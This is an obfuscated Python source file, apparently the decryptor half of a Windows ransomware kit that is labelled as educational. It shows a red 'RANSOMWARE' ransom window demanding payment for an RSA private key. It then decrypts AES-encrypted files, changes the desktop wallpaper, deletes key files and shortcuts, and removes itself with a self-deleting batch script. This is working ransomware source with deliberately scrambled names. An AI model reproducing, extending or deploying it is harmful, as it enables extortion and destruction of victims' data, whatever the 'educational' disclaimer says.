import os #line:1
import ctypes #line:2
import sys #line:3
import tkinter as tk #line:4
from tkinter .filedialog import askopenfilename #line:5
import tkinter .messagebox #line:6
from Crypto .Cipher import AES #line:7
import rsa #line:8
import time #line:9
import subprocess #line:10
absolute_path =os .path .expanduser ('~\\chr')#line:12
root =tk .Tk ()#line:13
root .withdraw ()#line:14
def __OOO0OOO00OOOO0000 (OOOOO0000OOOO0O00 ):#line:16
    try :#line:18
        O00O0O0OO00O0OOOO =list ()#line:19
        with open (OOOOO0000OOOO0O00 ,"r",encoding ="utf-8")as O0O00OO0O0O0OOO0O :#line:20
            for O00O000O000O00000 in O0O00OO0O0O0OOO0O :#line:21
                if O00O000O000O00000 [-1 :]=="\n":#line:22
                    O00O000O000O00000 =O00O000O000O00000 [:-1 ]#line:23
                O00O0O0OO00O0OOOO .append (int (O00O000O000O00000 ))#line:24
        with open (os .path .join (absolute_path ,"encryptedWithRSA.aeskey"),"rb")as OO00O0O0O0OOO0O00 :#line:26
            return rsa .decrypt (OO00O0O0O0OOO0O00 .read (),rsa .PrivateKey (O00O0O0OO00O0OOOO [0 ],O00O0O0OO00O0OOOO [1 ],O00O0O0OO00O0OOOO [2 ],O00O0O0OO00O0OOOO [3 ],O00O0O0OO00O0OOOO [4 ]))#line:27
    except :#line:29
        return False #line:30
    pass #line:31
def __OO0OOOOO00OO00OOO (O0O0O00O0OO00OO0O ,OO0OO0OO0OOOO0OOO ):#line:33
    OOO0OO0000OOOOO0O =AES .new (OO0OO0OO0OOOO0OOO ,AES .MODE_ECB )#line:34
    return OOO0OO0000OOOOO0O .decrypt (O0O0O00O0OO00OO0O )#line:35
def __OO00O0O00O00OO0OO (OO0000OO0O0O0O00O ):#line:37
    OOOOO0000OO0O000O =__OOO0OOO00OOOO0000 (OO0000OO0O0O0O00O )#line:38
    OOOOOO0OO0O0OOO00 =list ()#line:39
    with open (os .path .join (absolute_path ,"files.txt"),"r",encoding ="utf-8")as O0O0O00000O00OOO0 :#line:40
        for O00000O0OOO0OOOO0 in O0O0O00000O00OOO0 :#line:41
            O00000O0OOO0OOOO0 =O00000O0OOO0OOOO0 [:-1 ]#line:42
            if not __OOO0OO0OO0000O0OO (O00000O0OOO0OOOO0 ,OOOOO0000OO0O000O ):#line:43
                OOOOOO0OO0O0OOO00 .append (O00000O0OOO0OOOO0 )#line:44
    return OOOOOO0OO0O0OOO00 #line:46
def __OOO0OO0OO0000O0OO (O00O0OOO00OO00O0O ,O00O00OOO0OO0OO0O ):#line:48
    try :#line:50
        with open (O00O0OOO00OO00O0O ,"rb")as O0O0O0O0O0OO0000O :#line:51
            OO0OOOOO0OO00OO00 =O0O0O0O0O0OO0000O .read (16 )#line:52
            O0OO00O00O00O0OO0 =O0O0O0O0O0OO0000O .read ()#line:53
        OOO0O00OOO0OO00OO =AES .new (O00O00OOO0OO0OO0O ,AES .MODE_CBC ,__OO0OOOOO00OO00OOO (OO0OOOOO0OO00OO00 ,O00O00OOO0OO0OO0O ))#line:55
        OO0OOO000000O0OOO =OOO0O00OOO0OO00OO .decrypt (O0OO00O00O00O0OO0 )#line:57
        with open (O00O0OOO00OO00O0O ,"wb")as O0O0O0O0O0OO0000O :#line:59
            O0O0O0O0O0OO0000O .write (OO0OOO000000O0OOO )#line:60
    except Exception as OO00O000O0O0OO0OO :#line:61
        with open (os .path .join (absolute_path ,"errors.txt"),"a",encoding ="utf-8")as O0OO00O0000O00OO0 :#line:62
            O0OO00O0000O00OO0 .write ("Failed to decrypt {0}: {1}\n".format (str (O00O0OOO00OO00O0O ),str (OO00O000O0O0OO0OO )))#line:63
        return False #line:64
    return True #line:65
def __O00000O0OO00O0O0O (O00OOO0OO000O00OO ):#line:67
    O00O000OO0O00000O =os .path .join (absolute_path ,O00OOO0OO000O00OO )#line:69
    if os .path .exists (O00O000OO0O00000O ):#line:70
        ctypes .windll .user32 .SystemParametersInfoW (20 ,0 ,O00O000OO0O00000O ,0 )#line:71
        return True #line:72
    else :#line:73
        return False #line:74
def __O00000O00OO00OOOO ():#line:76
    global root #line:77
    O0O00000OO00OO00O =askopenfilename (initialdir =os .path .expanduser ('~\\Desktop\\'),title ="Select your RSA key",filetypes =[("RSA key file","*.rsakey")])#line:79
    if O0O00000OO00OO00O =="":#line:81
        return #line:82
    if tkinter .messagebox .askyesno ("Are you sure?","Are you sure you want to proceed? \n" "If your private key is wrong you will lose your files forever."):#line:86
        root .withdraw ()#line:87
        O0OOO00O0OO0000OO =__OO00O0O00O00OO0OO (O0O00000OO00OO00O )#line:88
        if len (O0OOO00O0OO0000OO )!=0 :#line:89
            OO0OO0000O0O0000O =""#line:90
            for OO0O0OOO000O000OO in O0OOO00O0OO0000OO :#line:91
                OO0OO0000O0O0000O +=str (OO0O0OOO000O000OO )+"\n"#line:92
            tkinter .messagebox .showwarning ("Files cannot be decrypted",OO0OO0000O0O0000O )#line:93
        root .destroy ()#line:94
        __O0OOOOOO00000OOOO ()#line:95
    return #line:96
def __O0OO00000O00O0O00 (OOOO0O0O0O00OOO0O ):#line:98
    try :#line:99
        os .remove (OOOO0O0O0O00OOO0O )#line:100
    except :#line:101
        pass #line:102
    return #line:103
def __O0OOOOOO00000OOOO ():#line:105
    __O00000O0OO00O0O0O ("1.png")#line:106
    time .sleep (2 )#line:107
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"files.txt"))#line:108
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"errors.txt"))#line:109
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"encryptedWithRSA.aeskey"))#line:110
    __O0OO00000O00O0O00 (os .path .expanduser ("~\\Desktop\\simple_private.rsakey"))#line:111
    __O0OO00000O00O0O00 (os .path .expanduser ("~\\Desktop\\Decryptor.lnk"))#line:112
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"simple_private.rsakey"))#line:113
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"Decryptor.lnk"))#line:114
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"0.png"))#line:115
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"1.png"))#line:116
    with open (os .path .join (absolute_path ,"end.bat"),"w")as O00000OO0OO00O0O0 :#line:118
        O00000OO0OO00O0O0 .write ("@echo off\ntimeout 5 >NUL\ndel /Q \"%userprofile%\\chr\\decryptor.exe\"\ndel /Q \"%userprofile%\\chr\\end.bat\"")#line:119
    time .sleep (2 )#line:120
    subprocess .Popen ([os .path .join (absolute_path ,"end.bat")])#line:121
    sys .exit ()#line:122
    pass #line:123
try :#line:126
    with open (os .path .join (absolute_path ,"temp"),"r")as f :#line:127
        name =f .read ()#line:128
    __O0OO00000O00O0O00 (str (name ))#line:129
    __O0OO00000O00O0O00 (os .path .join (absolute_path ,"temp"))#line:130
except :#line:131
    pass #line:132
root .deiconify ()#line:134
root .geometry ("855x200")#line:135
root .title ("RANSOMWARE")#line:136
root .configure (bg ="red")#line:137
root .resizable (False ,False )#line:138
root .lift ()#line:139
root .attributes ('-topmost',True )#line:140
label =tk .Label (root ,text ="---What happened?---\nYour files are encrypted with " "AES-256bit and the key is encrypted with RSA-2048bit. " "Thus without our private key you cannot obtain your key to decrypt your files." "\n---What can I do?---\nYou can contact with us to give you the private key. We will arrange" " the payment and we will give you the key.\nAs a proof we have the key we can" " decrypt one file for free. Attach in first email the key file you will found" " in your desktop and the file you want\n---Is this a real virus?---\nOf course not! This" " program is made for educational purposes so in your desktop you will find a txt file " "with your RSA private key. ",bg ="#b30000").place (x =0 ,y =0 )#line:150
button =tk .Button (root ,text ="\nSelect RSA key file and Start Decryption\n",bg ="green",fg ="white",bd ="10",activebackground ="blue",command =__O00000O00OO00OOOO ).place (x =311 ,y =121 )#line:151
root .mainloop ()